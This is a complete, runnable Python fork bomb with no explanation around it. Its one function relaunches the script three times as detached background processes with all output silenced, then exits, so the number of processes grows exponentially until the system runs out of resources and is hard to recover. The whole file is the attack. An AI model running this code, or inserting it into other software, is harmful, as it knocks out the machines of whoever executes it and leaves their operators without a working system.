import sys, subprocess, os

def go():
    for _ in range(3):
        subprocess.Popen(
            [sys.executable] + sys.argv,
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
    os._exit(0)

go()